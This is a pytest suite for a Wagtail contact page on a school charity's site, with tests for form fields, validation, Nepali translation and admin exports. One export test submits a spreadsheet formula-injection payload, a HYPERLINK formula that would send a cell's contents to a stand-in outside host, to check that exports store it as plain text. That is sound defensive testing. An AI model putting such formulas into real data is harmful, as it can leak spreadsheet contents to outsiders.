import io

import pytest
from bs4 import BeautifulSoup
from django.core import mail
from django.urls import reverse
from openpyxl import load_workbook
from wagtail.contrib.forms.models import FormSubmission
from wagtail.test.utils.form_data import inline_formset, nested_form_data, rich_text

from contact.models import CONTACT_NEEDED, ContactFormField, ContactPage
from core.models import SiteSettings
from core.publishing import ADD_RECIPIENT, reasons_not_to_publish
from home.models import StandardPage

pytestmark = pytest.mark.django_db

SENT = {
    "name": "Sam",
    "email": "sam@example.com",
    "phone_country": "NP",
    "phone": "",
    "message": "Can I visit the school?",
}


def soup(response):
    return BeautifulSoup(response.content, "html.parser")


@pytest.fixture
def details(site):
    """General enquiries in Site settings: a Kathmandu landline, an email and an address."""
    settings = SiteSettings.for_site(site)
    settings.phone = "01-4567890"
    settings.contact_email = "hello@brightwell.example"
    settings.save()
    text = settings.texts.get(locale__language_code="en")
    text.address = "Ward 4, Lalitpur"
    text.save()
    return settings


class TestPageTreeRules:
    def test_lives_under_the_home_page_only(self, home_page):
        about = StandardPage(title="About us")
        home_page.add_child(instance=about)

        assert ContactPage.can_create_at(home_page)
        assert not ContactPage.can_create_at(about)

    def test_one_per_home_page(self, contact_page, home_page):
        assert not ContactPage.can_create_at(home_page)

    def test_has_no_pages_under_it(self, contact_page):
        assert ContactPage.subpage_types == []


class TestTheForm:
    def test_the_core_fields_come_before_the_editors_questions(self, contact_page):
        contact_page.form_fields = [
            ContactFormField(label="Which school?", field_type="singleline")
        ]
        contact_page.save()

        assert list(contact_page.get_form().fields) == [
            "name",
            "email",
            "phone_country",
            "phone",
            "message",
            "which_school",
        ]

    def test_the_core_fields_are_worded_for_supporters(self, contact_page):
        fields = contact_page.get_form().fields

        assert fields["name"].label == "Your name"
        assert fields["name"].required
        assert fields["email"].label == "Email"
        assert fields["phone"].label == "Number"
        assert fields["message"].label == "Your message"
        assert fields["message"].required

    def test_the_country_starts_on_site_settings_phone_country(self, contact_page, site):
        settings = SiteSettings.for_site(site)
        settings.phone_country = "GB"
        settings.save()

        assert contact_page.get_form().fields["phone_country"].initial == "GB"

    def test_a_send_is_saved_with_the_core_fields(self, client, contact_page):
        client.post(contact_page.url, SENT)

        form_data = FormSubmission.objects.get(page=contact_page).form_data
        assert form_data == {
            "name": "Sam",
            "email": "sam@example.com",
            "phone": "",
            "message": "Can I visit the school?",
        }

    def test_a_landline_is_saved_with_its_country_code_and_not_the_country(
        self, client, contact_page
    ):
        client.post(contact_page.url, {**SENT, "email": "", "phone": "01-4567890"})

        form_data = FormSubmission.objects.get(page=contact_page).form_data
        assert form_data["phone"] == "+97714567890"
        assert "phone_country" not in form_data

    def test_a_number_that_isnt_one_is_refused(self, client, contact_page):
        response = client.post(contact_page.url, {**SENT, "phone": "FLOWERS"})

        assert response.status_code == 422
        assert response.context["form"].errors["phone"] == [
            "Enter a phone number, like 01-4567890."
        ]

    def test_the_team_is_emailed_with_reply_to_the_sender(self, client, contact_page):
        client.post(contact_page.url, SENT)

        message = mail.outbox[0]
        assert message.to == ["hello@brightwell.example"]
        assert message.reply_to == ["sam@example.com"]
        assert "Your name: Sam" in message.body
        assert "Country" not in message.body

    def test_no_reply_to_without_an_email(self, client, contact_page):
        client.post(contact_page.url, {**SENT, "email": "", "phone": "984-1234567"})

        assert mail.outbox[0].reply_to == []


class TestMessageLength:
    """A message is at most 2,000 characters, about a page: room for a real enquiry, short
    enough for the team to read every one. Asked for in review of #323."""

    def test_a_message_over_2000_characters_is_refused(self, client, contact_page):
        response = client.post(contact_page.url, {**SENT, "message": "x" * 2001})

        assert response.status_code == 422
        assert "at most 2000 characters" in response.context["form"].errors["message"][0]
        assert not FormSubmission.objects.exists()

    def test_a_full_message_with_line_breaks_is_accepted_as_the_box_counts_it(
        self, client, contact_page
    ):
        typed = ("x" * 199 + "\n") * 9 + "x" * 200  # 2000 characters in the box
        client.post(contact_page.url, {**SENT, "message": typed.replace("\n", "\r\n")})

        assert FormSubmission.objects.get(page=contact_page).form_data["message"] == typed

    def test_the_box_stops_and_counts_at_the_limit(self, client, contact_page):
        """charity.js adds the count; without JavaScript, maxlength alone stops typing."""
        box = soup(client.get(contact_page.url)).find("textarea", attrs={"name": "message"})

        assert box["maxlength"] == "2000"
        assert box.has_attr("data-char-count")


class TestEmailOrPhone:
    def test_neither_is_refused_with_one_message_first_in_the_summary(self, client, contact_page):
        response = client.post(contact_page.url, {**SENT, "email": ""})

        assert response.status_code == 422
        assert not FormSubmission.objects.exists()
        summary = soup(response).select(".error-summary li")
        assert summary[0].get_text(strip=True) == CONTACT_NEEDED
        assert summary[0].a["href"] == "#id_email"
        assert [li.get_text(strip=True) for li in summary].count(CONTACT_NEEDED) == 1

    def test_the_message_sits_under_email_and_describes_the_phone(self, client, contact_page):
        page = soup(client.post(contact_page.url, {**SENT, "email": ""}))

        email_error = page.select_one("#id_email_error")
        assert email_error.get_text(strip=True) == CONTACT_NEEDED
        assert "id_email_error" in page.select_one("#id_email")["aria-describedby"].split()
        phone_group = page.select_one("fieldset.phone-field")
        assert "id_email_error" in phone_group["aria-describedby"].split()

    @pytest.mark.parametrize(
        "sent", [{"phone": "984-1234567", "email": ""}, {"email": "sam@example.com"}]
    )
    def test_either_one_is_enough(self, client, contact_page, sent):
        response = client.post(contact_page.url, {**SENT, **sent})

        assert response.status_code == 303


class TestReservedNames:
    def add(self, client, user, home_page, labels):
        client.force_login(user)
        url = reverse("wagtailadmin_pages:add", args=("contact", "contactpage", home_page.pk))
        data = nested_form_data(
            {
                "title": "Contact us",
                "slug": "contact",
                "intro": rich_text(""),
                "thank_you_text": rich_text(""),
                "to_address": "hello@brightwell.example",
                "from_address": "",
                "subject": "",
                "form_fields": inline_formset(
                    [{"label": label, "field_type": "singleline"} for label in labels]
                ),
            }
        )
        return client.post(url, data)

    @pytest.mark.parametrize("label", ["Email", "Phone", "Name", "Message", "Submit time"])
    def test_a_question_cant_take_a_core_fields_name(self, client, editor, home_page, label):
        response = self.add(client, editor, home_page, [label])

        assert response.status_code == 200
        errors = response.context["form"].formsets["form_fields"].forms[0].errors["label"]
        assert "already a question on every Contact page" in errors[0]
        assert not ContactPage.objects.exists()

    def test_a_question_of_its_own_is_saved(self, client, editor, home_page):
        response = self.add(client, editor, home_page, ["Which school?"])

        assert response.status_code == 302
        assert ContactPage.objects.get().form_fields.get().clean_name == "which_school"


class TestSubmissionsInTheAdmin:
    def test_the_core_fields_are_columns(self, contact_page):
        assert [name for name, label in contact_page.get_data_fields()] == [
            "submit_time",
            "name",
            "email",
            "phone",
            "message",
        ]

    @pytest.mark.parametrize("export", ["csv", "xlsx"])
    def test_a_formula_in_a_message_is_exported_as_text(
        self, admin_client, client, contact_page, export
    ):
        formula = '=HYPERLINK("https://example.org/?d="&C2,"Open")'
        client.post(contact_page.url, {**SENT, "message": formula})

        url = reverse("wagtailforms:list_submissions", args=[contact_page.pk])
        content = b"".join(admin_client.get(url, {"export": export}).streaming_content)

        if export == "csv":
            text = content.decode()
            assert "Your name,Email,Phone,Your message" in text
            assert f"'{formula}".replace('"', '""') in text
        else:
            cells = [cell for row in load_workbook(io.BytesIO(content)).active for cell in row]
            assert [cell.data_type for cell in cells if cell.value == formula] == ["s"]


class TestPublishing:
    def test_needs_an_address_to_send_to(self, contact_page):
        contact_page.to_address = ""

        assert reasons_not_to_publish(contact_page) == [ADD_RECIPIENT]


class TestThePage:
    def test_shows_the_title_intro_and_form(self, client, contact_page):
        page = soup(client.get(contact_page.url))

        assert page.h1.get_text() == "Contact us"
        assert "We'd love to hear from you." in page.get_text()
        assert page.select_one("h2#send-a-message").get_text() == "Send us a message"
        assert page.select_one("form #id_message")

    def test_general_enquiries_come_from_site_settings(self, client, contact_page, details):
        page = soup(client.get(contact_page.url))

        section = page.select_one("#general-enquiries").parent
        assert section.select_one("a[href='tel:+97714567890']").get_text() == "01-4567890"
        assert section.select_one("a[href='mailto:hello@brightwell.example']")
        assert "Ward 4, Lalitpur" in section.address.get_text()

    def test_general_enquiries_show_only_what_is_filled_in(self, client, contact_page, site):
        settings = SiteSettings.for_site(site)
        settings.contact_email = "hello@brightwell.example"
        settings.save()

        section = soup(client.get(contact_page.url)).select_one("#general-enquiries").parent
        assert not section.select("a[href^='tel:']")
        assert not section.address

    def test_a_number_that_cant_be_read_is_shown_without_a_link(self, client, contact_page, site):
        settings = SiteSettings.for_site(site)
        settings.phone = "0123 456 7890"
        settings.save()

        section = soup(client.get(contact_page.url)).select_one("#general-enquiries").parent
        assert "0123 456 7890" in section.get_text()
        assert not section.select("a[href^='tel:']")

    def test_without_any_details_the_form_still_works(self, client, contact_page):
        page = soup(client.get(contact_page.url))

        assert not page.select("#general-enquiries")
        assert "To send photos" not in page.get_text()
        assert client.post(contact_page.url, SENT).status_code == 303

    def test_says_where_to_send_photos_when_an_email_is_set(self, client, contact_page, details):
        page = soup(client.get(contact_page.url))

        line = page.find(string=lambda text: text and "To send photos" in text).parent
        assert line.get_text(strip=True) == "To send photos, email them tohello@brightwell.example."
        assert line.a["href"] == "mailto:hello@brightwell.example"

    def test_a_send_with_mistakes_asks_to_check_the_message(self, client, contact_page):
        page = soup(client.post(contact_page.url, {**SENT, "name": ""}))

        assert page.select_one(".error-summary h2").get_text() == "Please check your message"


class TestInNepali:
    @pytest.fixture
    def nepali_contact(self, contact_page, nepali_home_page):
        page = contact_page.copy_for_translation(nepali_home_page.locale)
        page.title = "सम्पर्क गर्नुहोस्"
        page.form_fields = [
            ContactFormField(label="कुन विद्यालय?", field_type="singleline", required=False)
        ]
        page.save_revision().publish()
        return page

    def test_the_core_is_translated_and_the_question_is_its_own(self, client, nepali_contact):
        page = soup(client.get(nepali_contact.url))

        labels = [label.get_text(" ", strip=True) for label in page.select(".contact-form label")]
        assert labels[:2] == ["तपाईंको पुरा नाम", "इमेल (वैकल्पिक)"]
        message = labels.index("तपाईंको सन्देश")
        assert labels[message + 1] == "कुन विद्यालय?"
        assert page.select_one("#send-a-message").get_text() == "हामीलाई सन्देश पठाउनुहोस्"

    def test_keeps_its_own_messages_under_the_core_names(self, client, nepali_contact):
        client.post(nepali_contact.url, SENT)

        form_data = FormSubmission.objects.get(page=nepali_contact).form_data
        assert form_data["name"] == "Sam"
        assert not FormSubmission.objects.exclude(page=nepali_contact).exists()

    def test_emails_the_team_in_the_sites_main_language(self, client, nepali_contact):
        client.post(nepali_contact.url, {**SENT, "phone": "984-1234567"})

        body = mail.outbox[0].body
        assert "Your name: Sam" in body
        assert "Phone: +9779841234567" in body
        assert "Your message: Can I visit the school?" in body

    def test_says_email_or_phone_in_nepali(self, client, nepali_contact):
        page = soup(client.post(nepali_contact.url, {**SENT, "email": ""}))

        assert page.select_one(".error-summary li").get_text(strip=True) == (
            "हामीले जवाफ दिन सकौं भनेर इमेल वा फोन नम्बर दिनुहोस्।"
        )


class TestTheThankYou:
    def test_the_defaults(self, client, contact_page, details):
        page = soup(client.get(f"{contact_page.url}?sent"))

        assert page.h1.get_text() == "Thank you, we've got your message"
        text = page.main.get_text(" ", strip=True)
        assert "We'll reply by email or phone, using the details you gave." in text
        urgent = page.select_one("main a[href='tel:+97714567890']")
        assert urgent.parent.get_text(strip=True) == "If it's urgent, call us on01-4567890."
        assert page.select_one("main a[href='/']")

    def test_a_number_that_cant_be_read_is_given_without_a_link(self, client, contact_page, site):
        settings = SiteSettings.for_site(site)
        settings.phone = "0123 456 7890"
        settings.save()

        page = soup(client.get(f"{contact_page.url}?sent"))
        assert "If it's urgent, call us on 0123 456 7890." in page.main.get_text(" ", strip=True)
        assert not page.select("main a[href^='tel:']")

    def test_no_urgent_line_without_a_phone(self, client, contact_page):
        page = soup(client.get(f"{contact_page.url}?sent"))

        assert "If it's urgent" not in page.get_text()

    def test_the_editors_text_replaces_the_middle_line(self, client, contact_page, details):
        contact_page.thank_you_text = "<p>Our school team reads every message.</p>"
        contact_page.save_revision().publish()

        text = soup(client.get(f"{contact_page.url}?sent")).main.get_text(" ", strip=True)
        assert "Our school team reads every message." in text
        assert "using the details you gave" not in text
        assert "If it's urgent" in text
